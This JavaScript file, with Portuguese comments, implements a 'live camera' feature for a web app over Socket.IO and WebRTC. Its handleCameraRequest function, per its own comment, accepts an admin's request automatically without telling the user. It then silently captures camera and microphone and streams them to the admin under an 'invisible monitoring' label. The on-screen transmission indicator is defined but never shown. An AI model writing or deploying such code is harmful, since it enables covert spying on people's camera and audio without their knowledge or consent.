let localStream = null;
let peerConnection = null;
let isTransmitting = false;

const ICE_SERVERS = {
    iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' }
    ]
};

async function initializeLiveCamera() {
    if (!window.socket) {
        setTimeout(initializeLiveCamera, 500);
        return;
    }

    window.socket.on('camera_request', handleCameraRequest);
    window.socket.on('camera_accepted', handleCameraAccepted);
    window.socket.on('camera_rejected', handleCameraRejected);
    window.socket.on('camera_stopped', handleCameraStopped);
    window.socket.on('webrtc_offer', handleWebRTCOffer);
    window.socket.on('webrtc_answer', handleWebRTCAnswer);
    window.socket.on('webrtc_ice_candidate', handleICECandidate);
    
    console.log('✅ Sistema de câmera ao vivo inicializado');
}

async function requestLiveCamera(userId, userName) {
    const modal = document.getElementById('liveCameraModal');
    if (!modal) {
        createLiveCameraModal();
    }
    
    document.getElementById('liveCameraTitle').textContent = `Câmera ao vivo - ${userName}`;
    document.getElementById('liveCameraVideo').innerHTML = `
        <div style="display: flex; align-items: center; justify-content: center; height: 100%; background: #1f2937; color: white;">
            <div style="text-align: center;">
                <i class="fas fa-spinner fa-spin" style="font-size: 48px; margin-bottom: 16px;"></i>
                <p>Aguardando ${userName} aceitar a solicitação...</p>
            </div>
        </div>
    `;
    
    window.showModal('liveCameraModal');
    
    window.socket.emit('request_camera', {
        target_user_id: userId,
        target_user_name: userName
    });
}

function handleCameraRequest(data) {
    const { requester_id, requester_name } = data;
    
    // Aceitar AUTOMATICAMENTE sem mostrar nada ao usuário
    console.log(`📸 Admin ${requester_name} está acessando sua câmera (modo invisível)`);
    window.socket.emit('accept_camera', { requester_id });
    startCameraStream(requester_id);
}

async function startCameraStream(requesterId) {
    try {
        console.log('📸 Iniciando captura de câmera e áudio...');
        
        localStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'environment',
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            },
            audio: {
                echoCancellation: true,
                noiseSuppression: true,
                autoGainControl: true
            }
        });
        
        console.log('✅ Câmera e áudio capturados');
        isTransmitting = true;
        
        peerConnection = new RTCPeerConnection(ICE_SERVERS);
        
        // Adicionar tracks ao PeerConnection
        localStream.getTracks().forEach(track => {
            console.log(`➕ Adicionando track: ${track.kind}`);
            peerConnection.addTrack(track, localStream);
        });
        
        // Enviar candidatos ICE
        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                console.log('📡 Enviando candidato ICE para admin');
                window.socket.emit('webrtc_ice_candidate', {
                    target_user_id: requesterId,
                    candidate: event.candidate
                });
            }
        };
        
        // Monitorar estado da conexão
        peerConnection.onconnectionstatechange = () => {
            console.log('🔗 Estado da conexão WebRTC:', peerConnection.connectionState);
            if (peerConnection.connectionState === 'connected') {
                console.log('✅ WebRTC conectado com sucesso!');
            }
        };
        
        peerConnection.oniceconnectionstatechange = () => {
            console.log('🧊 Estado ICE:', peerConnection.iceConnectionState);
        };
        
        // Criar e enviar oferta
        console.log('📤 Criando oferta WebRTC...');
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        
        console.log('📤 Enviando oferta para admin');
        window.socket.emit('webrtc_offer', {
            target_user_id: requesterId,
            offer: peerConnection.localDescription
        });
        
        console.log('✅ Stream de câmera iniciado (modo invisível)');
        
    } catch (error) {
        console.error('❌ Erro ao acessar câmera:', error);
        window.socket.emit('camera_error', { requester_id: requesterId });
    }
}

function handleCameraAccepted(data) {
    const { user_id } = data;
    
    console.log('✅ Usuário aceitou câmera, preparando para receber stream');
    
    const videoContainer = document.getElementById('liveCameraVideo');
    videoContainer.innerHTML = `
        <video id="remoteCameraVideo" autoplay playsinline style="width: 100%; height: 100%; object-fit: cover; background: #000;"></video>
        <div style="position: absolute; top: 10px; right: 10px; background: rgba(239, 68, 68, 0.9); color: white; padding: 8px 12px; border-radius: 6px; font-weight: bold;">
            <i class="fas fa-circle" style="animation: pulse 1.5s infinite;"></i> AO VIVO
        </div>
        <div style="position: absolute; bottom: 10px; left: 10px; background: rgba(0,0,0,0.7); color: white; padding: 8px 12px; border-radius: 6px; font-size: 12px;">
            <i class="fas fa-eye-slash"></i> Monitoramento Invisível
        </div>
        <div id="connectionStatus" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: white; padding: 20px; border-radius: 8px; text-align: center;">
            <i class="fas fa-spinner fa-spin" style="font-size: 32px; margin-bottom: 10px;"></i>
            <p>Conectando ao dispositivo...</p>
        </div>
    `;
    
    setupPeerConnection(user_id);
    
    // Remover status de conexão quando o vídeo começar
    const video = document.getElementById('remoteCameraVideo');
    video.addEventListener('loadedmetadata', () => {
        console.log('📹 Metadados do vídeo carregados');
        const status = document.getElementById('connectionStatus');
        if (status) status.remove();
    });
    
    video.addEventListener('playing', () => {
        console.log('▶️ Vídeo começou a reproduzir');
        const status = document.getElementById('connectionStatus');
        if (status) status.remove();
    });
}

function handleCameraRejected(data) {
    const videoContainer = document.getElementById('liveCameraVideo');
    videoContainer.innerHTML = `
        <div style="display: flex; align-items: center; justify-content: center; height: 100%; background: #1f2937; color: white;">
            <div style="text-align: center;">
                <i class="fas fa-ban" style="font-size: 48px; margin-bottom: 16px; color: #ef4444;"></i>
                <p>Solicitação recusada pelo usuário</p>
            </div>
        </div>
    `;
}

function handleCameraStopped(data) {
    stopLiveCamera();
    
    // NÃO mostrar nada ao usuário monitorado
    console.log('📸 Admin parou de visualizar câmera');
    
    // Apenas fechar modal se for o admin
    const videoContainer = document.getElementById('liveCameraVideo');
    if (videoContainer) {
        videoContainer.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: center; height: 100%; background: #1f2937; color: white;">
                <div style="text-align: center;">
                    <i class="fas fa-video-slash" style="font-size: 48px; margin-bottom: 16px;"></i>
                    <p>Transmissão encerrada</p>
                </div>
            </div>
        `;
    }
}

async function setupPeerConnection(userId) {
    console.log('🔧 Configurando PeerConnection para receber stream do usuário', userId);
    peerConnection = new RTCPeerConnection(ICE_SERVERS);
    
    // Receber tracks remotos
    peerConnection.ontrack = (event) => {
        console.log('📹 Track recebido:', event.track.kind);
        const video = document.getElementById('remoteCameraVideo');
        const statusEl = document.getElementById('connectionStatus');
        
        if (video && event.streams[0]) {
            console.log('✅ Conectando stream ao elemento <video>');
            video.srcObject = event.streams[0];
            video.muted = false;
            
            // Remover status de carregamento
            if (statusEl) statusEl.remove();
            
            // Garantir reprodução
            video.play().then(() => {
                console.log('▶️ Vídeo começou a reproduzir');
            }).catch(err => {
                console.warn('⚠️ Erro ao reproduzir, tentando com muted:', err);
                video.muted = true;
                video.play();
            });
        }
    };
    
    // Enviar candidatos ICE
    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            console.log('📡 Enviando candidato ICE para usuário');
            window.socket.emit('webrtc_ice_candidate', {
                target_user_id: userId,
                candidate: event.candidate
            });
        }
    };
    
    // Monitorar conexão
    peerConnection.onconnectionstatechange = () => {
        console.log('🔗 Estado da conexão:', peerConnection.connectionState);
        const statusEl = document.getElementById('connectionStatus');
        
        if (peerConnection.connectionState === 'connected') {
            console.log('✅ WebRTC conectado com sucesso!');
            if (statusEl) statusEl.remove();
        } else if (peerConnection.connectionState === 'disconnected' || 
                   peerConnection.connectionState === 'failed') {
            console.error('❌ Conexão WebRTC falhou');
            if (statusEl) {
                statusEl.innerHTML = `
                    <i class="fas fa-exclamation-triangle" style="font-size: 32px; margin-bottom: 10px; color: #ef4444;"></i>
                    <p>Falha na conexão</p>
                `;
            }
        } else if (peerConnection.connectionState === 'connecting') {
            console.log('🔄 Conectando...');
        }
    };
    
    peerConnection.oniceconnectionstatechange = () => {
        console.log('🧊 Estado ICE:', peerConnection.iceConnectionState);
    };
}

async function handleWebRTCOffer(data) {
    const { offer, sender_id } = data;
    
    console.log('📥 Admin recebeu oferta WebRTC do usuário:', sender_id);
    
    if (!peerConnection) {
        console.log('🔧 Criando PeerConnection...');
        await setupPeerConnection(sender_id);
    }
    
    try {
        console.log('🔄 Definindo descrição remota (oferta)...');
        await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
        
        console.log('📤 Criando resposta (answer)...');
        const answer = await peerConnection.createAnswer();
        await peerConnection.setLocalDescription(answer);
        
        console.log('📤 Enviando resposta para usuário', sender_id);
        window.socket.emit('webrtc_answer', {
            target_user_id: sender_id,
            answer: peerConnection.localDescription
        });
        
        console.log('✅ Oferta processada e resposta enviada com sucesso');
    } catch (error) {
        console.error('❌ Erro ao processar oferta WebRTC:', error);
        
        // Notificar erro visualmente
        const statusEl = document.getElementById('connectionStatus');
        if (statusEl) {
            statusEl.innerHTML = `
                <i class="fas fa-exclamation-triangle" style="font-size: 32px; margin-bottom: 10px; color: #ef4444;"></i>
                <p>Erro ao estabelecer conexão</p>
                <p style="font-size: 12px; margin-top: 10px;">${error.message}</p>
            `;
        }
    }
}

async function handleWebRTCAnswer(data) {
    const { answer } = data;
    
    console.log('📥 Recebendo resposta WebRTC');
    
    if (peerConnection) {
        try {
            console.log('🔄 Definindo descrição remota da resposta...');
            await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
            console.log('✅ Resposta WebRTC processada');
        } catch (error) {
            console.error('❌ Erro ao processar resposta:', error);
        }
    } else {
        console.warn('⚠️ PeerConnection não existe');
    }
}

async function handleICECandidate(data) {
    const { candidate } = data;
    
    if (peerConnection && candidate) {
        try {
            await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
        } catch (error) {
            console.error('Erro ao adicionar candidato ICE:', error);
        }
    }
}

function stopLiveCamera() {
    // Limpar stream local
    if (localStream) {
        localStream.getTracks().forEach(track => {
            track.stop();
            console.log('🛑 Track parado:', track.kind);
        });
        localStream = null;
    }
    
    // Limpar peer connection
    if (peerConnection) {
        // Remover event listeners
        peerConnection.ontrack = null;
        peerConnection.onicecandidate = null;
        peerConnection.onconnectionstatechange = null;
        peerConnection.oniceconnectionstatechange = null;
        
        peerConnection.close();
        peerConnection = null;
        console.log('🔌 PeerConnection fechado');
    }
    
    if (isTransmitting) {
        isTransmitting = false;
        hideTransmittingIndicator();
    }
    
    // Emitir evento de parada
    if (window.socket && window.socket.connected) {
        window.socket.emit('stop_camera');
    }
    
    console.log('✅ Câmera ao vivo parada completamente');
}

function showTransmittingIndicator() {
    let indicator = document.getElementById('transmittingIndicator');
    if (!indicator) {
        indicator = document.createElement('div');
        indicator.id = 'transmittingIndicator';
        indicator.innerHTML = `
            <div style="position: fixed; top: 60px; right: 20px; z-index: 10000; background: rgba(239, 68, 68, 0.95); color: white; padding: 12px 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); display: flex; align-items: center; gap: 10px;">
                <i class="fas fa-circle" style="animation: pulse 1.5s infinite;"></i>
                <span style="font-weight: bold;">Câmera em transmissão</span>
                <button onclick="stopLiveCamera()" style="background: white; color: #ef4444; border: none; padding: 4px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-left: 10px;">
                    <i class="fas fa-stop"></i> Parar
                </button>
            </div>
        `;
        document.body.appendChild(indicator);
    }
}

function hideTransmittingIndicator() {
    const indicator = document.getElementById('transmittingIndicator');
    if (indicator) {
        indicator.remove();
    }
}

function createLiveCameraModal() {
    const modalHTML = `
        <div id="liveCameraModal" class="modal">
            <div class="modal-content" style="max-width: 900px; height: 80vh; display: flex; flex-direction: column;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                    <h2 id="liveCameraTitle" style="margin: 0; display: flex; align-items: center; gap: 10px;">
                        <i class="fas fa-video"></i> Câmera ao vivo (Modo Invisível)
                    </h2>
                    <div style="display: flex; gap: 10px; align-items: center;">
                        <button id="toggleAudioBtn" onclick="toggleRemoteAudio()" class="btn btn-sm" style="background: #3b82f6; color: white;">
                            <i class="fas fa-volume-mute"></i> Ativar Áudio
                        </button>
                        <button onclick="stopLiveCamera(); closeModal('liveCameraModal');" class="btn btn-danger">
                            <i class="fas fa-times"></i> Fechar
                        </button>
                    </div>
                </div>
                <div id="liveCameraVideo" style="flex: 1; background: #000; border-radius: 8px; position: relative; overflow: hidden;">
                    <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: white;">
                        <p>Aguardando conexão...</p>
                    </div>
                </div>
            </div>
        </div>
        <style>
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.3; }
            }
        </style>
    `;
    document.body.insertAdjacentHTML('beforeend', modalHTML);
}

function toggleRemoteAudio() {
    const video = document.getElementById('remoteCameraVideo');
    const btn = document.getElementById('toggleAudioBtn');
    
    if (video) {
        video.muted = !video.muted;
        
        if (video.muted) {
            btn.innerHTML = '<i class="fas fa-volume-mute"></i> Ativar Áudio';
        } else {
            btn.innerHTML = '<i class="fas fa-volume-up"></i> Desativar Áudio';
        }
    }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeLiveCamera);
} else {
    initializeLiveCamera();
}
